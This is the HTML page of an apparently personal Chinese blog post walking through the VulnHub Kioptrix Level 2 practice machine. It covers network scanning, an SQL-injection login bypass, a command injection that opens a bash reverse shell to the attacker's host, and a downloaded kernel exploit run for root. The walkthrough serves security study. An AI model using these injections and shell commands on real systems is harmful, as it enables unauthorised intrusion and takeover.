@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/orange.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/orange.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="HMAT9TapFXG6PRtARF9Qc_fDKANMj-rP3F5FjHjr7kI">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|EB Garamond:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://dana5haw.com').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":true,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: './public/search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+<script data-ad-client="ca-pub-3938956891324222" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-203752309-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-203752309-1');
+</script>
+  <meta name="description" content="探测靶机这台靶机的版本是centos4.5，要更改虚拟机文件CentOs4.5.vmx，将ethernet0.networkName &#x3D; &quot;Bridged&quot;改成ethernet0.networkName &#x3D; &quot;Nat&quot;。这样改了之后，我们就能探测到靶机IP了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub靶机练习之Kioptix Level 2">
+<meta property="og:url" content="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Two.html">
+<meta property="og:site_name" content="Dana Shaw&#39;s blog">
+<meta property="og:description" content="探测靶机这台靶机的版本是centos4.5，要更改虚拟机文件CentOs4.5.vmx，将ethernet0.networkName &#x3D; &quot;Bridged&quot;改成ethernet0.networkName &#x3D; &quot;Nat&quot;。这样改了之后，我们就能探测到靶机IP了。">
+<meta property="og:locale" content="ZH_CN">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7g3ugsnrj313d0lljt3.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7h1zn9v8j30xz0m30tw.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7h1j93jcj31f60p5wkn.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7hbaqxnfj317k0iqtgv.jpg">
+<meta property="article:published_time" content="2020-02-24T05:55:56.000Z">
+<meta property="article:modified_time" content="2020-06-27T14:12:28.713Z">
+<meta property="article:author" content="Dana Shaw">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta property="article:tag" content="Kioptix Level 2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7g3ugsnrj313d0lljt3.jpg">
+
+<link rel="canonical" href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Two.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>vulnhub靶机练习之Kioptix Level 2 | Dana Shaw's blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-203752309-1"></script>
+    <script>
+      var host = window.location.host;
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      if (host.indexOf("127.0.0.1") == -1 && host.indexOf("localhost") == -1) {
+        gtag('js', new Date());
+        gtag('config', 'UA-203752309-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Dana Shaw's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Dana Shaw's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">为了去往别处</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+        <li class="menu-item menu-item-readnotes">
+
+    <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" rel="section"><i class="fa fa-fw fa-book"></i>读书笔记</a>
+
+  </li>
+        <li class="menu-item menu-item-movienotes">
+
+    <a href="/categories/%E8%A7%82%E5%BD%B1%E7%AC%94%E8%AE%B0/" rel="section"><i class="fa fa-fw fa-youtube"></i>观影笔记</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="ZH-CN">
+    <link itemprop="mainEntityOfPage" href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Two.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/./images/photo.jpg">
+      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="description" content="连尘埃也想收藏">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dana Shaw's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub靶机练习之Kioptix Level 2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-24 13:55:56" itemprop="dateCreated datePublished" datetime="2020-02-24T13:55:56+08:00">2020-02-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-27 22:12:28" itemprop="dateModified" datetime="2020-06-27T22:12:28+08:00">2020-06-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">vulnhub靶机练习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="探测靶机"><a href="#探测靶机" class="headerlink" title="探测靶机"></a>探测靶机</h2><p>这台靶机的版本是centos4.5，要更改虚拟机文件<code>CentOs4.5.vmx</code>，将<code>ethernet0.networkName = &quot;Bridged&quot;</code>改成<code>ethernet0.networkName = &quot;Nat&quot;</code>。这样改了之后，我们就能探测到靶机IP了。</p>
+<a id="more"></a>
+
+<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7g3ugsnrj313d0lljt3.jpg" alt="image.png"><br>使用<code>sudo arp-scan -l</code>探测到靶机IP为192.168.80.16。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b2:07:af, IPv4: 192.168.80.14</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.80.2    00:50:56:fc:96:a7       VMware, Inc.</span><br><span class="line">192.168.80.16   00:0c:29:6d:00:a3       VMware, Inc.</span><br><span class="line">192.168.80.254  00:50:56:f8:e1:4e       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.073 seconds (123.49 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
+<h2 id="进一步扫描"><a href="#进一步扫描" class="headerlink" title="进一步扫描"></a>进一步扫描</h2><p>使用<code>sudo nmap -sS -T5 -Pn 192.168.80.16</code>扫描，发现靶机开放的端口及服务如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sS -T5 -Pn 192.168.80.16</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 01:02 EST</span><br><span class="line">Nmap scan report for 192.168.80.16</span><br><span class="line">Host is up (0.0017s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">443/tcp  open  https</span><br><span class="line">631/tcp  open  ipp</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:6D:00:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.44 seconds</span><br></pre></td></tr></table></figure>
+<p>nmap扫描详细信息，输入命令<code>sudo nmap -A -T5 -sS 192.168.80.16</code>。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -A -T5 -sS 192.168.80.16</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-24 01:15 EST</span><br><span class="line">Nmap scan report for 192.168.80.16</span><br><span class="line">Host is up (0.0010s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind    2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/https?</span><br><span class="line">|_ssl-date: 2020-02-24T04:06:21+00:00; -2h09m35s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">631/tcp  open  ipp        CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">3306/tcp open  mysql      MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:6D:00:A3 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -2h09m35s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.04 ms 192.168.80.16</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 109.12 seconds</span><br></pre></td></tr></table></figure>
+<h2 id="80端口可打开网页"><a href="#80端口可打开网页" class="headerlink" title="80端口可打开网页"></a>80端口可打开网页</h2><p>我们用nmap扫描得到的信息是这个靶机存在http服务，于是在浏览器输入192.168.80.16，进入到web界面。<br>这个界面只需要输入用户名和密码即可登入，我们尝试一下万能密码。用户名：<code>&#39;or 1=1#</code>，成功进入管理台。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7h1zn9v8j30xz0m30tw.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7h1j93jcj31f60p5wkn.jpg" alt="image.png"></p>
+<h2 id="利用提交功能反弹靶机shell"><a href="#利用提交功能反弹靶机shell" class="headerlink" title="利用提交功能反弹靶机shell"></a>利用提交功能反弹靶机shell</h2><p>攻击机监听4444端口，web界面提交<code>ping 192.168.80.14; bash -i &gt;&amp; /dev/tcp/192.168.80.14/4444 0&gt;&amp;1</code>。反弹shell是用bash脚本<code>bash -i &gt;&amp; /dev/tcp/192.168.80.14/4444 0&gt;&amp;1</code>实现的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nc -lvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.80.16: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.80.14] from (UNKNOWN) [192.168.80.16] 43719</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-3.00$ whoami</span><br><span class="line">apache</span><br><span class="line">bash-3.00$ pwd</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc7hbaqxnfj317k0iqtgv.jpg" alt="image.png"></p>
+<ul>
+<li>拓展知识（各种反弹shell的方法）<br><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">参考</a><h2 id="找到内核漏洞"><a href="#找到内核漏洞" class="headerlink" title="找到内核漏洞"></a>找到内核漏洞</h2>从刚刚获取到的shell，我们看看靶机操作系统的内核信息，发现这个内核版本发行期是2007年，so old……<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure>
+于是在<a href="https://www.exploit-db.com/exploits/9545" target="_blank" rel="noopener">网上</a>找到这个内核版本的漏洞利用方法。把这个漏洞利用脚本下载到攻击机：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wget https://www.exploit-db.com/download/9545</span><br><span class="line">--2020-02-24 01:41:53--  https://www.exploit-db.com/download/9545</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: ‘9545’</span><br><span class="line"></span><br><span class="line">9545                           [ &lt;=&gt;                                   ]   9.55K  --.-KB/s    in 0s      </span><br><span class="line"></span><br><span class="line">2020-02-24 01:41:58 (25.7 MB/s) - ‘9545’ saved [9783]</span><br></pre></td></tr></table></figure>
+攻击机：<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ mv 9545 exploit.c</span><br><span class="line">kali@kali:~$ sudo mv exploit.c /var/www/html/ #将漏洞利用脚本放到web目录</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">kali@kali:~$ /etc/init.d/apache2 start #开启apache服务</span><br><span class="line">Starting apache2 (via systemctl): apache2.service.</span><br></pre></td></tr></table></figure>
+靶机shell从攻击机下载exploit：<code>curl 192.168.80.14/exploit.c -o exploit.c</code>。运行这个exp即可获取到靶机root权限。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ cd &#x2F;tmp &amp;&amp; id &amp;&amp; curl 192.168.80.14&#x2F;exploit.c -o exploit.c 2&gt; &#x2F;dev&#x2F;null &amp;&amp; gcc exploit.c &amp;&amp; .&#x2F;a.out</span><br><span class="line">uid&#x3D;48(apache) gid&#x3D;48(apache) groups&#x3D;48(apache)</span><br><span class="line">exploit.c:376:28: warning: no newline at end of file</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><a href="https://v3ded.github.io/ctf/kioptrix2.html" target="_blank" rel="noopener">https://v3ded.github.io/ctf/kioptrix2.html</a><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>从这台靶机练习，主要学习怎么反弹shell。遇到简单的web登录界面，首先尝试万能密码是否能登入系统。<br>用户提交的内容是shell脚本（如：ping命令）这种情况，我们得明白<code>;</code>可以连接多个shell脚本，并且服务器会依次执行脚本。根据这个原理，我们把恶意脚本（如反弹shell的脚本）放到<code>;</code>后面，就可以欺骗服务器执行恶意脚本。<br>靶机的操作系统版本较低时，在网上找相关版本的内核漏洞，进行利用。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Dana Shaw
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Two.html" title="vulnhub靶机练习之Kioptix Level 2">https://dana5haw.com/posts/ZH-CN/Vulnhub_Kioptrix_Two.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+
+  <div class="wechat_OA">
+	<span>欢迎关注我的公众号(Welcome to follow me on Wechat)</span>
+	<br>
+    <!-- 这里添加你的二维码图片 -->
+	<img src ="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
+</div>
+
+</ul>
+</div>
+
+
+      <div>   
+         
+        <div>     
+             
+    <div style="text-align:center;color: #ccc;font-size:14px;">
+        -------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------
+    </div>     
+     
+</div>   
+     
+      </div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+              <a href="/tags/Kioptix-Level-2/" rel="tag"><i class="fa fa-tag"></i> Kioptix Level 2</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/ZH-CN/Vulnhub_Kioptrix_One.html" rel="prev" title="vulnhub靶机练习之Kioptix Level 1">
+      <i class="fa fa-chevron-left"></i> vulnhub靶机练习之Kioptix Level 1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/ZH-CN/Redis_Summary.html" rel="next" title="redis数据库学习总结">
+      redis数据库学习总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#探测靶机"><span class="nav-number">1.</span> <span class="nav-text">探测靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进一步扫描"><span class="nav-number">2.</span> <span class="nav-text">进一步扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80端口可打开网页"><span class="nav-number">3.</span> <span class="nav-text">80端口可打开网页</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用提交功能反弹靶机shell"><span class="nav-number">4.</span> <span class="nav-text">利用提交功能反弹靶机shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#找到内核漏洞"><span class="nav-number">5.</span> <span class="nav-text">找到内核漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考博文"><span class="nav-number">6.</span> <span class="nav-text">参考博文</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span 